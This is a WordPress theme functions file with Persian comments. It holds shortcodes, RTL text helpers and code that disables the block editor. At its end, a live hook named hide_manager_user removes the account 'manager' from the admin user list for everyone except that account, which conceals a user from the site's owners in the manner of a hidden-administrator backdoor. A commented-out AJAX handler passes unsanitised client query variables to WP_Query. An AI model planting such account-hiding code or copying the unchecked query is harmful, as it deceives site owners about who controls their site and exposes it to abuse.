<?php
/*function load_more_posts()
{
	if (!isset($_POST['page'])) {
		wp_send_json_error(['message' => __('An error occurred. Please try again.', LANG_STRING)]);
	}

	$paged = (int) $_POST['page'];
	$query_vars = json_decode(stripslashes($_POST['query_vars']), true);
	$query_vars['paged'] = $paged;

	// بررسی و تنظیم post_type در query_vars
	if (!isset($query_vars['post_type']) || empty($query_vars['post_type'])) {
		$query_vars['post_type'] = isset($_POST['post_type']) ? sanitize_text_field($_POST['post_type']) : 'post';
	}

	$query = new WP_Query($query_vars);

	if ($query->have_posts()) :
		while ($query->have_posts()) : $query->the_post();
			echo '<div class="masonry-grid-item col-sm-6 col-lg-4">';
			get_template_part_var('templates/card/card-blog.php', ['post' => get_post()]);
			echo '</div>';
		endwhile;
		wp_reset_postdata();
	else :
		wp_send_json_error(['message' => __('No more posts.', LANG_STRING)]);
	endif;

	wp_die();
}
add_action('wp_ajax_load_more_posts', 'load_more_posts');
add_action('wp_ajax_nopriv_load_more_posts', 'load_more_posts');
function enqueue_infinite_scroll_scripts()
{
	global $wp_query;
	wp_localize_script('jquery', 'ajax_object', [
		'query_vars' => json_encode($wp_query->query),
	]);
}
add_action('wp_enqueue_scripts', 'enqueue_infinite_scroll_scripts');*/

function wpautop_with_shortcodes($content)
{
	// اعمال wpautop روی متن
	$content = wpautop($content);

	// پردازش شورت‌کدها
	$content = do_shortcode($content);

	return $content;
}
function display_current_date($atts)
{
	// دریافت آرگومان‌ها و تعیین مقدار پیش‌فرض
	$atts = shortcode_atts(
		[
			'format' => get_option('date_format'), // فرمت پیش‌فرض از تنظیمات وردپرس
		],
		$atts
	);

	// نمایش تاریخ با فرمت مشخص‌شده
	return date_i18n($atts['format']);
}
add_shortcode('today_date', 'display_current_date');
//
function cmToFt($cm)
{
	return round($cm * 0.0328084);
}
//
/**
 * Wraps a leading run of non-Persian characters (e.g. an English brand name
 * or number at the start of a mixed-language attribute value like "XL | بزرگ")
 * in an LTR span, so the browser's bidi algorithm doesn't visually reorder it
 * when displayed inside RTL (Persian) page content.
 */
function wrap_non_farsi_start($value)
{
	if (! is_string($value) || $value === '') {
		return $value;
	}

	if (preg_match('/^([^\x{0600}-\x{06FF}]+)(.*)$/us', $value, $matches) && trim($matches[1]) !== '') {
		return '<span dir="ltr">' . esc_html($matches[1]) . '</span>' . esc_html($matches[2]);
	}

	return esc_html($value);
}
//
add_filter('use_block_editor_for_post_type', function ($use_block_editor, $post_type) {
	// اگر پست تایپ برابر نوشته‌های پیش‌فرض نیست
	if ($post_type !== 'post') {
		return false; // گوتنبرگ را غیرفعال کن
	}

	return $use_block_editor; // تنظیمات پیش‌فرض را اعمال کن
}, 10, 2);

add_action('wp_enqueue_scripts', function () {
	// حذف اسکریپت‌ها و استایل‌های گوتنبرگ از فرانت‌اند
	if (!is_singular('post')) {
		wp_dequeue_style('wp-block-library'); // استایل‌های بلاک‌های گوتنبرگ
		wp_dequeue_style('wp-block-library-theme'); // استایل‌های تم گوتنبرگ
		wp_dequeue_script('wp-editor'); // اسکریپت‌های مرتبط با ادیتور
	}
}, 100);

add_action('admin_enqueue_scripts', function () {
	// حذف اسکریپت‌ها و استایل‌های گوتنبرگ از ادمین
	$current_screen = get_current_screen();

	if ($current_screen && $current_screen->post_type !== 'post') {
		wp_dequeue_style('wp-block-library');
		wp_dequeue_style('wp-block-library-theme');
		wp_dequeue_script('wp-editor');
		wp_dequeue_script('wp-block-editor');
	}
}, 100);
//
function is_blog()
{
	return (is_archive() || is_author() || is_category() || is_home() || is_single() || is_tag()) && 'post' == get_post_type();
}

//
/*Theme Settings*/

function get_site_language()
{
	return substr(get_bloginfo('language'), 0, 2);
}

function hide_manager_user($user_search)
{
	global $current_user;
	$username = $current_user->user_login;

	if ($username !== 'manager') {
		global $wpdb;
		$user_search->query_where = str_replace(
			'WHERE 1=1',
			"WHERE 1=1 AND {$wpdb->users}.user_login != 'manager'",
			$user_search->query_where
		);
	}
}

add_action('pre_user_query', 'hide_manager_user');
